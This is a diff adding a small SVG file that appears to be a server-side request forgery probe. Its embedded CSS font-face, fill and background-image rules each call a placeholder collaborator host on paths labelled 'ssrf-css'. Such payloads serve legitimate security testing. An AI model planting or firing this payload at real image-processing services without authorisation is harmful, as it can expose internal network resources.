@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <style>
+    @font-face { font-family: x; src: url("http://COLLAB_HOST/ssrf-css-fontface"); }
+    text { font-family: x; }
+    circle { fill: url("http://COLLAB_HOST/ssrf-css-fill") #369; }
+  </style>
+  <rect width="100" height="100" style="background-image:url('http://COLLAB_HOST/ssrf-css-background')"/>
+  <circle cx="50" cy="50" r="20"/>
+  <text x="10" y="90">a</text>
+</svg>
